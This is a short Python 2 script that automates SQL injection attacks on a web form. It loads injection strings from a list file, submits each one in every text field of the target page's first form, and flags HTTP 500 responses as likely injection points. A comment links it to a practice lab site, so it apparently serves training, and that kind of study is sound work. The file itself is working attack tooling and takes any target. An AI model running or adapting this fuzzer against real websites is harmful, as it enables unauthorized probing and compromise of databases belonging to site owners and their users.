#/bin/python
# http://attack.samsclass.info/sqlol/search.htm
import mechanize 
import logging
import time
from optparse import OptionParser
from urllib2 import HTTPError
import Queue
import threading

start = time.time()

def sqli(target, sqli_list):
  
  sqli_list = open(sqli_list)
  for sqli in sqli_list.readlines():
    sqli = sqli.rstrip()
    br = mechanize.Browser()
    br.set_handle_equiv(False)
    br.set_handle_redirect(False)
    br.set_handle_referer(False)
    br.set_handle_robots(False)
    br.open(target)
    br.select_form(nr=0)
    time.sleep(2)
    for field in br.form.controls:
      if field.type == "text":
        br.form[field.name] = str(sqli)
    print br.form#"! injecting {0}, in the form {1}, on the page: {2}".format(str(sqli), str(br.form.name), str(target))
    request = br.click(type="submit")
    response = br.open(request)
    if response.code == 200:
      print "No dice... 200 OK response"
    if response.code == 500:
      print "500 Internal Error, potential SQL with {0}".format(str(field))

	  
def main():
  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # Option for target web form to brute
  optp.add_option("-t", "--target", dest="target",
                  help="The target page to attack")
				  
  # Option for sqli list to use in attack
  optp.add_option("-s", "--sqli", dest="sqli",
                  help="The list of SQL Injection attacks to use")
				  
  opts, args = optp.parse_args()

  if opts.target is None:
    opts.target = raw_input("What is the target page to attack w/ sqli: ")
	
  if opts.sqli is None:
    opts.sqli = raw_input("What is the SQL injection file to use in our attack: ")
	
  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')


  # Main Event Loop:
  try:
    sqli(opts.target, opts.sqli)
  
  except (KeyboardInterrupt, EOFError) as e:
    print "Exiting..."
    exit(0)
	
  print "Injection Complete!"
  print "Elapsed Time: %s" % (time.time() - start)
  
if __name__ == '__main__':
  main()
	  
